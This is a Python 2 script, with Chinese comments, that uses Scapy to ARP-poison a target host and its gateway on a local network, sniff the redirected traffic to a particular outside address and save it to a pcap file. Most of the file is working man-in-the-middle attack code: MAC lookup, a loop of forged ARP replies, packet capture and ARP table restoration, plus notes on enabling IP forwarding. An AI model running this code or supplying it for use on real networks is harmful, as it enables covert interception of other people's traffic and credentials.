#! /usr/bin/python2
# coding:utf-8


'''
开启IP转发
两种方式，
临时：echo "1">/proc/sys/net/ipv4/ip_forward
$ sudo echo 1 > /proc/sys/net/ipv4/ip_forward
bash: /proc/sys/net/ipv4/ip_forward: 权限不够
有两种方法可以解决这个问题：

1、使用root登录（需要设置root密码，然后su）。

2、使用如下命令：

tony@ubuntu-a:~$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
[sudo] password for tony:
1


固定：修改/etc/sysctl.conf，取消这一行的注释：
net.ipv4.ip_forward= 1
然后使之立即生效
sysctl -p
'''
import os
from scapy.all import *
import threading
import time
import signal
import sys

#获取目标ip的mac

def get_mac(ip):
    #发送arp请求到指定的ip，然后从返回的数据中获得目标mac
    responses,unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip),timeout = 2,retry = 10)
    for s,r in responses:
        return r[Ether].src
    return None

#发送arp请求

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    #构建欺骗目标的arp请求
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    #构建网关的arp请求
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print '[*] Beginning the arp poison.[CTRL C TO STOP]'

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            #还原网络设置
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    print "arp poison attack finish!"
    return


#还原网络
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print "Restore target..."
    send(ARP(op = 2,psrc = gateway_ip,pdst = target_ip,hwdst = "ff:ff:ff:ff:ff:ff",hwsrc = gateway_mac),count = 5)
    send(ARP(op = 2,psrc = target_ip,pdst = gateway_ip,hwdst = "ff:ff:ff:ff:ff:ff",hwsrc = target_mac),count = 5)
    #发送退出信号
    os.kill(os.getpid(),signal.SIGINT)


if __name__ == "__main__":

    interface = 'wlp3s0'
    target_ip = '192.168.1.105'
    gateway_ip = '192.168.1.1'
    packet_count = 1000

    #设置嗅探网卡
    conf.iface = interface
    #关闭输出
    conf.verb = 0

    print "Setting up %s"%interface

    #获取目标和网关mac
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac == None:
        print "Failed to get gateway_mac!"
        sys.exit(0)
    else:
        print 'gateway_mac is %s'%gateway_mac

    target_mac = get_mac(target_ip)
    if target_mac == None:
        print "Failed to get target_mac!"
        sys.exit(0)
    else:
        print 'target_mac is %s'%target_mac


    #执行中间人攻击线程
    arp_poison = threading.Thread(target = poison_target,args = (gateway_ip,gateway_mac,target_ip,target_mac,))
    arp_poison.start()

    #抓包
    try:
        #bpf_filter = "ip host %s"%target_ip
        bpf_filter = "host 59.67.0.245"
        pacp = sniff(iface = interface,count = packet_count,filter = bpf_filter)
        print pacp.show()
        wrpcap('%s.pacp'%target_ip,pacp)
        #wireshark(http and ip.addr == 59.67.0.245)
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    except KeyboardInterrupt:
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
        sys.exit(0)
